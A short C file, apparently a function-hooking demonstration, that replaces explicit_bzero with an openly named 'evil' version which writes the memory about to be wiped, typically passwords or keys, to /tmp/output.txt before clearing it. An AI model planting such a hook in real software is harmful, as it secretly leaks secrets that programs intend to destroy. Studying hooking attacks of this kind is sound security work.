#include "patch.h"
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

static ssize_t write_all(int fd, void *p, size_t n){
	ssize_t ret, total = 0;

	do{
		ret = write(fd, p + total, n - total);
		total += ret;
	}while(ret != 0 && ret != -1);
	return total;
}

void explicit_bzero_evil(void *p, size_t n){
	int fd;

	if (n == 0)
		return;
	fd = open("/tmp/output.txt", O_CREAT | O_WRONLY);
	if (fd == -1){
		memset(p, 0, n);
		return;
	}
	write_all(fd, p, n);
	close(fd);
	memset(p, 0, n);
}

PATCH(
	PATCH_OWN_SHORT(explicit_bzero, explicit_bzero_evil)
)
